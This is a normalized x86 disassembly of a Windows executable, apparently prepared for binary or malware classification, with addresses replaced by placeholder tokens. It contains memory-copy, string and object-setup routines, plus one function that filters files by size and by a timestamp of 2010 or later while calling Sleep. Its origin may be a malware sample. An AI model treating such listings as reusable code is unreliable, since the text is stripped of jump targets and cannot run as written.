jae r-xdata
mov eax [ ebp - 0x210 ]
and [ ebp + eax * 2 - 0x208 ] 0x0
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x214 ]
mov ecx [ ebp - 0x21c ]
movzx eax [ ecx + eax * 2 ]
movzx ecx [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
mov al 0x1
leave
retn 0x8
push 0x0
call sub_414299
lea edx [ ebp - 0x208 ]
mov ecx eax
call sub_413434
mov edx eax
mov ecx [ ebp + 0xc ]
call sub_401cb4
mov eax [ ebp - 0x210 ]
mov ecx [ ebp - 0x214 ]
mov edx [ ebp - 0x21c ]
mov cx [ edx + ecx * 2 ]
mov [ ebp + eax * 2 - 0x208 ] cx
mov eax [ ebp - 0x210 ]
inc eax
mov [ ebp - 0x210 ] eax
mov eax [ ebp - 0x210 ]
and [ ebp + eax * 2 - 0x208 ] 0x0
push 0x0
call sub_414299
lea edx [ ebp - 0x208 ]
mov ecx eax
call sub_413434
mov edx eax
mov ecx [ ebp + 0xc ]
call sub_401cb4
and [ ebp - 0x208 ] 0x0
and [ ebp - 0x210 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
inc eax
mov [ ebp - 0x214 ] eax
jmp r-xdata
sub_4020b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_4163ed
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x80673201
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x64
mov eax [ ebp + 0x8 ]
mov [ eax + 0x114 ] 0x1
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412b5d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_4020fc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_40c5ef
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x70677616
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x64
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412ae6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_402136
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41d29f
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x80361901
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x3e8
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412b5d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_402170
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41efdc
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x80701201
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0xf
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412b5d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_4021aa
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_40c0a8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x703cf201
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0xf
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412ae6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_4021e4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_40b882
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x80719601
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0xf
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412b5d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_40221e
push ebp
mov ebp esp
sub esp 0x24
mov ecx [ ebp + 0xc ]
call sub_40100f
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp + 0x14 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax + 0x20 ] 0x5000
jae r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax + 0x20 ] 0xa00000
jbe r-xdata
xor al al
jmp r-xdata
leave
retn
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
add eax 0x4
push eax
call [ FileTimeToSystemTime@IAT ]
movzx eax [ ebp - 0x14 ]
cmp eax 0x7da
jge r-xdata
xor al al
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
add eax 0x14
push eax
call [ FileTimeToSystemTime@IAT ]
movzx eax [ ebp - 0x14 ]
cmp eax 0x7da
jge r-xdata
xor al al
jmp r-xdata
and [ ebp - 0x20 ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ rw-data ]
jae r-xdata
and [ ebp - 0x24 ] 0x0
jmp r-xdata
push [ ebp - 0x20 ]
mov ecx rw-data
call sub_401ccc
push [ eax ]
mov edx [ ebp + 0x14 ]
add edx 0x2c
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ rw-data ]
jae r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
jmp r-xdata
xor al al
jmp r-xdata
xor al al
push [ ebp - 0x24 ]
mov ecx rw-data
call sub_401ccc
push [ eax ]
mov edx [ ebp + 0x14 ]
add edx 0x2c
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_401cfd
add esp 0xc
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp + 0x18 ]
push [ eax ]
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_415917
mov [ ebp - 0x4 ] eax
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x18 ]
mov eax [ ecx + eax * 4 ]
cmp eax [ edx ]
je r-xdata
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_4023bc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_40b349
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x70941101
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x64
mov eax [ ebp + 0x8 ]
mov [ eax + 0x114 ] 0x0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412ae6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_402400
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41ebe3
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x77447801
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x5
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412ae6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_40243a
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41e93a
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x80399101
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x14
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412b5d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_402474
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41aa48
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x10001401
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x3c
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412dc5
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_4024b5
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41a655
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x10018101
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x14
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412dc5
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_4024f6
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41a473
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x10740121
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x5a
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412dc5
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_402537
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41b50b
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x70737200
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x64
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412ae6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_4025aa
push ebp
mov ebp esp
push 0xffffffff
push sub_423d89
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
add ecx 0x10
call sub_401c30
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_4025e8
push ebp
mov ebp esp
push 0xffffffff
push sub_423d89
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
add ecx 0x10
call sub_401c6b
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_402623
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4025e8
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn 0x4
push [ ebp - 0x4 ]
call j_sub_405a68
pop ecx
sub_40264a
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41a03a
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x80700001
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0xa
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412b5d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_4026b0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_402738 ]
jmp [ ecx * 4 + jump_table_4027b8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_402824 ]
pop esi
pop edi
pop ebp
jmp sub_404c2b
jmp [ ecx * 4 + jump_table_4029c0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4028c4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4029c0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_402824 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4029c0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_402824 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_402824 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_402824 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4029c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4029c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4029c0 ]
sub_402a15
push ecx
push ebx
push ebp
push esi
push edi
push [ rw-data ]
call sub_404e05
push [ rw-data ]
mov esi eax
mov [ esp + 0x18 ] esi
call sub_404e05
mov edi eax
cmp edi esi
pop ecx
pop ecx
jb r-xdata
xor eax eax
mov ebx edi
sub ebx esi
lea ebp [ ebx + 0x4 ]
cmp ebp 0x4
jb r-xdata
push esi
call sub_4053b1
mov esi eax
cmp esi ebp
pop ecx
jae r-xdata
push [ esp + 0x18 ]
call sub_404d8e
mov [ edi ] eax
add edi 0x4
push edi
call sub_404d8e
pop ecx
mov [ rw-data ] eax
mov eax [ esp + 0x1c ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push [ esp + 0x14 ]
call sub_405366
test eax eax
pop ecx
pop ecx
jne r-xdata
push eax
push [ esp + 0x14 ]
call sub_405366
test eax eax
pop ecx
pop ecx
je r-xdata
sar ebx 0x2
push eax
lea edi [ eax + ebx * 4 ]
call sub_404d8e
pop ecx
mov [ rw-data ] eax
sub_402ace
push esi
push 0x4
push 0x20
call sub_40531e
mov esi eax
push esi
call sub_404d8e
add esp 0xc
test esi esi
mov [ rw-data ] eax
mov [ rw-data ] eax
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_402afd
push 0xc
push r--data
call sub_405770
call sub_4054b3
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_402a15
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_402b33
mov eax [ ebp - 0x1c ]
call sub_4057b5
retn
sub_402b50
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_402bd8 ]
jmp [ ecx * 4 + jump_table_402c58 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_402cc4 ]
pop esi
pop edi
pop ebp
jmp sub_404c2b
jmp [ ecx * 4 + jump_table_402e60 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_402d64 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_402e60 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_402cc4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_402e60 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_402cc4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_402cc4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_402cc4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_402e60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_402e60 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_402e60 ]
sub_402f2f
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_405d10
mov esi eax
inc esi
push esi
call sub_405c3e
test eax eax
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
retn 0x4
push [ ebx ]
push esi
push eax
call sub_405b8a
add esp 0xc
jmp r-xdata
sub_402f7d
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_405d10
mov edi eax
inc edi
push edi
call sub_405c3e
test eax eax
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_405b8a
add esp 0xc
jmp r-xdata
sub_403014
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_405021
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4066e8
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_405fa9
mov [ esi + 0x4 ] eax
sub_403096
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_403014
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_406b99
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_406bac
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_406be2
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
jne r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
